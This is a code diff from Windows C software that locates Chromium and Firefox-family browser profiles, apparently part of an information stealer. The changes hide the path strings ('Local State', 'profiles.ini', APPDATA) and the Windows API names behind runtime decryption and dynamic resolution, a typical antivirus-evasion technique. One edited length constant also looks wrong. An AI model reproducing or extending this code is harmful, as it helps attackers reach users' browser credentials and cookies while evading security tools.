 const BrowserPath *get_chromium_browsers(size_t *count) {
     if (!chromium_merged) {
-        init_browsers();
+        init_browser_tables();
         merged_chromium_count = 0;
 
         /* 1. Registry discovery */
@@ -383,8 +751,10 @@ static void bp_fs_scan(
     int    wlen = bp_wlen(dir_w);
     size_t nlen = strlen(dir_n);
 
-    /* 1. Probe: does dir\\Local State exist? */
-    bp_wappend(dir_w, MAX_PATH, L"\\Local State");
+    /* 1. Probe: does dir\Local State exist? */
+    wchar_t wlocalstate[16];
+    enc_decrypt_wide(enc_wLocalState, ENC_WLOCALSTATE_LEN, wlocalstate);
+    bp_wappend(dir_w, MAX_PATH, wlocalstate);
 
     WIN32_FIND_DATAW fd;
     HANDLE h = pFF(dir_w, &fd);
@@ -479,14 +849,18 @@ int discover_chromium_browsers_fs(BrowserPath *out, size_t max_out, size_t *coun
     char  base_n[MAX_PATH];
 
     /* Scan %LOCALAPPDATA% (roaming = 0) */
-    if (pGetEnv(L"LOCALAPPDATA", base_w, MAX_PATH) > 0) {
+    wchar_t wlocalappdata[16];
+    enc_decrypt_wide(enc_wLOCALAPPDATA, ENC_WLOCALAPPDATA_LEN, wlocalappdata);
+    if (pGetEnv(wlocalappdata, base_w, MAX_PATH) > 0) {
         bp_wtoa(base_w, base_n, MAX_PATH);
         bp_fs_scan(base_w, base_n, 0, 2, 0,
                    out, max_out, count, pFF, pFN, pFC);
     }
 
     /* Scan %APPDATA% (roaming = 1) */
-    if (pGetEnv(L"APPDATA", base_w, MAX_PATH) > 0) {
+    wchar_t wappdata[16];
+    enc_decrypt_wide(enc_wAPPDATA, ENC_WAPPDATA_LEN, wappdata);
+    if (pGetEnv(wappdata, base_w, MAX_PATH) > 0) {
         bp_wtoa(base_w, base_n, MAX_PATH);
         bp_fs_scan(base_w, base_n, 0, 2, 1,
                    out, max_out, count, pFF, pFN, pFC);
@@ -548,15 +922,17 @@ int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
     typedef BOOL   (WINAPI *FnFindNextW)(HANDLE, LPWIN32_FIND_DATAW);
     typedef BOOL   (WINAPI *FnFindClose)(HANDLE);
 
-    FnGetEnvW    pGetEnvW    = (FnGetEnvW)   gecko_resolve_fn(k32, "GetEnvironmentVariableW");
-    FnFindFirstW pFindFirstW = (FnFindFirstW) gecko_resolve_fn(k32, "FindFirstFileW");
-    FnFindNextW  pFindNextW  = (FnFindNextW)  gecko_resolve_fn(k32, "FindNextFileW");
-    FnFindClose  pFindClose  = (FnFindClose)  gecko_resolve_fn(k32, "FindClose");
+    FnGetEnvW    pGetEnvW    = (FnGetEnvW)   ({ char fn_e[32]; enc_decrypt(enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN, fn_e); gecko_resolve_fn(k32, fn_e); });
+    FnFindFirstW pFindFirstW = (FnFindFirstW) ({ char fn_f[32]; enc_decrypt(enc_FindFirstFileW, ENC_FINDFIRSTFILEW_LEN, fn_f); gecko_resolve_fn(k32, fn_f); });
+    FnFindNextW  pFindNextW  = (FnFindNextW)  ({ char fn_n[32]; enc_decrypt(enc_FindNextFileW, ENC_FINDNEXTFILEW_LEN, fn_n); gecko_resolve_fn(k32, fn_n); });
+    FnFindClose  pFindClose  = (FnFindClose)  ({ char fn_c[32]; enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn_c); gecko_resolve_fn(k32, fn_c); });
     if (!pGetEnvW || !pFindFirstW || !pFindNextW || !pFindClose) return -1;
 
     /* ── Get %APPDATA% ──────────────────────────────────────────── */
     WCHAR appdata[MAX_PATH + 1];
-    DWORD alen = pGetEnvW(L"APPDATA", appdata, MAX_PATH);
+    wchar_t wappdata2[16];
+    enc_decrypt_wide(enc_wAPPDATA, ENC_WAPPDATA_LEN, wappdata2);
+    DWORD alen = pGetEnvW(wappdata2, appdata, MAX_PATH);
     if (alen == 0 || alen >= MAX_PATH) return 0;  /* no APPDATA → success, 0 found */
     appdata[alen] = 0;
 
@@ -571,9 +947,11 @@ int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
     HANDLE h = pFindFirstW(search, &fd);
     if (h == INVALID_HANDLE_VALUE) return 0;
 
-    /* Wide string L"\\profiles.ini" for file-existence probe */
-    static const WCHAR w_pi[] = L"\\profiles.ini";
-    const size_t w_pi_len = 13;  /* wcslen(w_pi) */
+    /* Wide string for file-existence probe */
+    static WCHAR w_pi[16];
+    static int w_pi_init = 0;
+    if (!w_pi_init) { enc_decrypt_wide(enc_wprofilesini, ENC_WPROFILESINI_LEN, w_pi); w_pi_init = 1; }
+    const size_t w_pi_len = 14;  /* wcslen("\\profiles.ini") */
 
     do {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
